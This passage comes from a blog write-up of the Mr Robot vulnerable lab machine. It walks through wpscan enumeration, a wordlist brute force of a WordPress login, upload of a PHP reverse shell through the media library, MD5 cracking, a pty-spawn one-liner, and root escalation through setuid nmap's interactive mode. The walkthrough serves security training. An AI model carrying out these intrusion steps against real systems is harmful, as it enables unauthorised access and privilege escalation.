| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/sqlqhit.asp">http://192.168.217.145/search/sqlqhit.asp</a>
| [+] CODE: 200 URL: <a href="http://192.168.217.145/search/SQLQHit.asp">http://192.168.217.145/search/SQLQHit.asp</a></p>

<h1>| [+] CODE: 200 URL: <a href="http://192.168.217.145/sitemap.xml">http://192.168.217.145/sitemap.xml</a></h1>

<p>```</p>

<p>What do you know, a Wordpress instance is running on the server! So it&rsquo;s time for wpscan!</p>

<h3>wpscan description</h3>

<p>Homepage: <a href="https://wpscan.org/">https://wpscan.org/</a></p>

<blockquote><p>WPScan is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<h3>wpscan options</h3>

<p>```
wpscan &mdash;help</p>

<hr />

<pre><code>    __          _______   _____                  
    \ \        / /  __ \ / ____|                 
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team 
                   Version 2.9.2
      Sponsored by Sucuri - https://sucuri.net
</code></pre>

<p>   @<em>WPScan</em>, @ethicalhack3r, @erwan_lr, pvdl, @<em>FireFart</em></p>

<hr />

<p>Help :</p>

<p>Some values are settable in a config file, see the example.conf.json</p>

<p>&mdash;update                            Update the database to the latest version.
&mdash;url       | -u <target url>       The WordPress URL/domain to scan.
&mdash;force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
&mdash;enumerate | -e [option(s)]        Enumeration.
  option :</p>

<pre><code>u        usernames from id 1 to 10
u[10-20] usernames from id 10 to 20 (you must write [] chars)
p        plugins
vp       only vulnerable plugins
ap       all plugins (can take a long time)
tt       timthumbs
t        themes
vt       only vulnerable themes
at       all themes (can take a long time)
</code></pre>

<p>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</p>

<p>&mdash;exclude-content-based &ldquo;<regexp or string>&rdquo;</p>

<pre><code>                                Used with the enumeration option, will exclude all occurrences based on the regexp or string supplied.
                                You do not need to provide the regexp delimiters, but you must write the quotes (simple or double).
</code></pre>

<p>&mdash;config-file  | -c <config file>   Use the specified config file, see the example.conf.json.
&mdash;user-agent   | -a &lt;User-Agent>    Use the specified User-Agent.
&mdash;cookie <string>                   String to read cookies from.
&mdash;random-agent | -r                 Use a random User-Agent.
&mdash;follow-redirection                If the target url has a redirection, it will be followed without asking if you wanted to do so or not
&mdash;batch                             Never ask for user input, use the default behaviour.
&mdash;no-color                          Do not use colors in the output.
&mdash;log                               Creates a log.txt file with WPScan&rsquo;s output.
&mdash;no-banner                         Prevents the WPScan banner from being displayed.
&mdash;disable-accept-header             Prevents WPScan sending the Accept HTTP header.
&mdash;disable-referer                   Prevents setting the Referer header.
&mdash;disable-tls-checks                Disables SSL/TLS certificate verification.
&mdash;wp-content-dir <wp content dir>   WPScan try to find the content directory (ie wp-content) by scanning the index page, however you can specify it.</p>

<pre><code>                                Subdirectories are allowed.
</code></pre>

<p>&mdash;wp-plugins-dir <wp plugins dir>   Same thing than &mdash;wp-content-dir but for the plugins directory.</p>

<pre><code>                                If not supplied, WPScan will use wp-content-dir/plugins. Subdirectories are allowed
</code></pre>

<p>&mdash;proxy &lt;[protocol://]host:port>    Supply a proxy. HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported.</p>

<pre><code>                                If no protocol is given (format host:port), HTTP will be used.
</code></pre>

<p>&mdash;proxy-auth &lt;username:password>    Supply the proxy login credentials.
&mdash;basic-auth &lt;username:password>    Set the HTTP Basic authentication.
&mdash;wordlist | -w <wordlist>          Supply a wordlist for the password brute forcer.
&mdash;username | -U <username>          Only brute force the supplied username.
&mdash;usernames     &lt;path-to-file>      Only brute force the usernames from the file.
&mdash;cache-dir       &lt;cache-directory> Set the cache directory.
&mdash;cache-ttl       &lt;cache-ttl>       Typhoeus cache TTL.
&mdash;request-timeout &lt;request-timeout> Request Timeout.
&mdash;connect-timeout &lt;connect-timeout> Connect Timeout.
&mdash;threads  | -t <number of threads> The number of threads to use when multi-threading requests.
&mdash;max-threads     &lt;max-threads>     Maximum Threads.
&mdash;throttle        <milliseconds>    Milliseconds to wait before doing another web request. If used, the &mdash;threads should be set to 1.
&mdash;help     | -h                     This help screen.
&mdash;verbose  | -v                     Verbose output.
&mdash;version                           Output the current version and exit.</p>

<p>Examples :</p>

<p>-Further help &hellip;
ruby ./wpscan.rb &mdash;help</p>

<p>-Do &lsquo;non-intrusive&rsquo; checks &hellip;
ruby ./wpscan.rb &mdash;url www.example.com</p>

<p>-Do wordlist password brute force on enumerated users using 50 threads &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;threads 50</p>

<p>-Do wordlist password brute force on the &lsquo;admin&rsquo; username only &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;wordlist darkc0de.lst &mdash;username admin</p>

<p>-Enumerate installed plugins &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate p</p>

<p>-Enumerate installed themes &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate t</p>

<p>-Enumerate users &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate u</p>

<p>-Enumerate installed timthumbs &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;enumerate tt</p>

<p>-Use a HTTP proxy &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy 127.0.0.1:8118</p>

<p>-Use a SOCKS5 proxy &hellip; (cURL >= v7.21.7 needed)
ruby ./wpscan.rb &mdash;url www.example.com &mdash;proxy socks5://127.0.0.1:9000</p>

<p>-Use custom content directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-content-dir custom-content</p>

<p>-Use custom plugins directory &hellip;
ruby ./wpscan.rb -u www.example.com &mdash;wp-plugins-dir wp-content/custom-plugins</p>

<p>-Update the DB &hellip;
ruby ./wpscan.rb &mdash;update</p>

<p>-Debug output &hellip;
ruby ./wpscan.rb &mdash;url www.example.com &mdash;debug-output 2>debug.log</p>

<p>See README for further information.
```</p>

<p>First, I updated the wpscan databse with <code>wpscan &mdash;update</code>. Then I performed some enumeration on the target:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145">http://192.168.217.145</a> &mdash;enumerate u vp vt &mdash;no-banner
[+] URL: <a href="http://192.168.217.145/">http://192.168.217.145/</a>
[+] Started: Sat Jul  1 07:40:05 2017</p>

<p>[+] robots.txt available under: &lsquo;<a href="http://192.168.217.145/robots.txt">http://192.168.217.145/robots.txt</a>&rsquo;
[!] The WordPress &lsquo;<a href="http://192.168.217.145/readme.html">http://192.168.217.145/readme.html</a>&rsquo; file exists exposing a version number
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
[+] XML-RPC Interface available under: <a href="http://192.168.217.145/xmlrpc.php">http://192.168.217.145/xmlrpc.php</a></p>

<p>[+] WordPress version 4.3.11 (Released on 2017-05-16) identified from rss generator, rdf generator, atom generator, links opml
[!] 1 vulnerability identified from the version number</p>

<p>[!] Title: WordPress 2.3-4.7.5 &ndash; Host Header Injection in Password Reset</p>

<pre><code>Reference: https://wpvulndb.com/vulnerabilities/8807
Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
</code></pre>

<p>[+] Enumerating plugins from passive detection &hellip;
[+] No plugins found</p>

<p>[+] Enumerating usernames &hellip;
[+] We did not enumerate any usernames</p>

<p>[+] Finished: Sat Jul  1 07:40:07 2017
[+] Requests Done: 57
[+] Memory used: 17.109 MB
[+] Elapsed time: 00:00:02
```</p>

<p>I couldn&rsquo;t use wpscan&rsquo;s findings for exploitation. Based on our earlier finding of a dictionary file, the next step seems to involve bruteforcing. I went back to the file and looked at its size:</p>

<p><code>
wc -l fsocity.dic
858160 fsocity.dic
</code></p>

<p>Not a small one, but maybe it contains duplicates:</p>

<p><code>
sort fsocity.dic | uniq | wc -l
11451
</code></p>

<p>A little over 11k, much more promising! I created a new file without the duplicates: <code>sort fsocity.dic | uniq > fsociety.txt</code>.</p>

<p>The next step was to visit <a href="http://192.168.217.145/wp-login.php">http://192.168.217.145/wp-login.php</a> and try to gather more information. Bogus login attempts triggered the message: ERROR: Invalid username. Next, I looked in the source to see how form parameters look like:</p>

<p><img class="center" src="/images/pentest/mr-robot/wplogin.png" title="&lsquo;wplogin&rsquo; &lsquo;wplogin&rsquo;" ></p>

<p>It seemed I would have to bruteforce for both username and password, but I tried a few character names from the series first, and that&rsquo;s how I found that elliot is a valid user. With this, I used wpscan to perform the bruteforce attack for the password:</p>

<p>```
wpscan &mdash;url <a href="http://192.168.217.145/">http://192.168.217.145/</a> &mdash;wordlist ~/Downloads/fsociety.txt &mdash;username elliot
[&hellip;]
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : elliot Password : ER28-0652</p>

<p>  Brute Forcing &lsquo;elliot&rsquo; Time: 00:02:27 &lt;==================================                                    > (5640 / 11452) 49.24%  ETA: 00:02:32
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | Id | Login  | Name | Password  |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |    | elliot |      | ER28-0652 |
  +&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Excellent, wpscan found the password is <em>ER28-0652</em>! I logged in and noticed that all the plugins are outdated:</p>

<p><img class="center" src="/images/pentest/mr-robot/plugins.png" title="&lsquo;wp plugins&rsquo; &lsquo;wp plugins&rsquo;" ></p>

<p>I tried uploading a PHP reverse shell as plugin, but got an error that it couldn&rsquo;t install it. I looked in other places where I could upload it, and when browsing the Media tab, I noticed my shell was there :O</p>

<p><img class="center" src="/images/pentest/mr-robot/media.png" title="&lsquo;media library&rsquo; &lsquo;media library&rsquo;" ></p>

<p>Wasn&rsquo;t sure where it placed in, so I just tried adding shell.php to the URL, and Wordpress kindly gave me the correct path to it, which was <a href="http://192.168.217.145/wp-content/uploads/2017/07/shell.php">http://192.168.217.145/wp-content/uploads/2017/07/shell.php</a></p>

<h2>Flag #2</h2>

<p>Finally achieved presence on the machine:</p>

<p><code>
$ whoami
daemon
$ ls /home
robot
$ ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</code></p>

<p>Found the second flag, but couldn&rsquo;t read it. However, that md5 file was readable:</p>

<p><code>
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
</code></p>

<p>I cracked the MD5 hash to reveal the password <em>abcdefghijklmnopqrstuvwxyz</em> for the user robot. I tried switching to that user, but I got the following error:</p>

<p><code>
$ su robot
su: must be run from a terminal
</code></p>

<p>The error appears because the shell isn&rsquo;t interactive. But I ran into this before, and again <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">pentestmonkey&rsquo;s oneliners</a> came to the rescue:</p>

<p>```
$ python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz</p>

<p>robot@linux:/$
```</p>

<p>I grabbed the second flag, and noticed that my commands are now echoed in the terminal and it&rsquo;s annoying:</p>

<p><code>
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
</code></p>

<h2>Flag #3</h2>

<p>I couldn&rsquo;t find a workaround for that, so I just continued. When I looked for SUID binaries, I found a surprise:</p>

<p><code>
robot@linux:/$ find / -type f \( -perm +4000 -o -perm +2000 \) -print 2&gt; /dev/null
[...]
/usr/local/bin/nmap
</code></p>

<p>After Googling, there even seems to be a <a href="https://www.rapid7.com/db/modules/exploit/unix/local/setuid_nmap">setuid Nmap exploit</a> in Metasploit! I read more about this problem, and found an interesting <a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">SANS paper</a> (the Nmap stuff begins on page 11). After some reading, I found that older versions of Nmap had an interactive mode, where you could run shell commands from or drop into a shell (similar to mysql):</p>

<p>```
robot@linux:/$ nmap &mdash;interactive
nmap &mdash;interactive</p>

<p>Starting nmap V. 3.81 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )
Welcome to Interactive Mode &mdash; press h <enter> for help
nmap>
```</p>

<p>The Nmap version is 3.81, so I tried it out:</p>

<p><code>
nmap&gt; !whoami
!whoami
root
waiting to reap child : No child processes
</code></p>

<p>It did work! Game over, Mr Robot!</p>

<p>```
nmap> !sh
!sh</p>

<h1>ls /root</h1>

<p>ls /root
firstboot_done  key-3-of-3.txt</p>

<h1>cat /root/key-3-of-3.txt</h1>

<p>cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```</p>

<p>Another interesting challenge, more story driven. It reminded me of <a href="https://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/">Primer</a>.</p>

<p><strong>Learn more</strong></p>

<ul>
<li><p><a href="https://blog.sucuri.net/2015/12/using-wpscan-finding-wordpress-vulnerabilities.html">Using wpscan to find Wordpress vulnerabilities</a></p></li>
<li><p><a href="https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744">Attack and Defend: Linux Privilege Escalation Techniques of 2016</a></p></li>
</ul>


<p>```</p>

<hr />

<p>/ You have literary talent that you \
\ should take pains to develop.     /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
